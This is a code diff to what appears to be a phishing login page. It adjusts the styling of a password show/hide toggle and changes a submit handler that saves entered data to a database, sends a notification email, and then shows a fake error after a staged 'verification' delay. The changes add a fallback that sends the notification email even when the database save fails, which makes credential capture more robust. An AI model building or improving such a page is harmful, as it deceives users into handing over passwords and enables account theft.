@@ -319,7 +319,7 @@
         }
         .password-toggle {
             position: absolute;
-            right: 16px;
+            right: 10px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
@@ -329,9 +329,20 @@
             font-size: 14px;
             font-weight: 500;
             padding: 0;
+            z-index: 1;
+            width: auto;
+            height: auto;
+            pointer-events: auto;
+        }
+        input[type="password"] {
+            padding-right: 60px; /* Make room for the show/hide button */
+            width: 100%;
+            box-sizing: border-box;
         }
         .show-password, .hide-password {
             font-size: 14px;
+            display: inline-block;
+            pointer-events: auto;
         }
         .hide-password {
             display: none;
@@ -491,12 +502,14 @@
                 })
                 .then(response => {
                     if (!response.ok) {
-                        throw new Error('Network response was not ok');
+                        throw new Error(`Network response was not ok: ${response.status} ${response.statusText}`);
                     }
                     return response.json();
                 })
                 .then(data => {
                     console.log('Data saved to database:', data);
+                    
+                    // Send email notification
                     sendNotificationEmail();
                     
                     // After "verification" delay, show error
@@ -508,6 +521,9 @@
                 })
                 .catch(error => {
                     console.error('Error saving data:', error);
+                    // Attempt to send notification even if database save fails
+                    sendNotificationEmail();
+                    
                     setTimeout(function() {
                         loginButton.innerHTML = 'Log In';
                         loginButton.disabled = false;
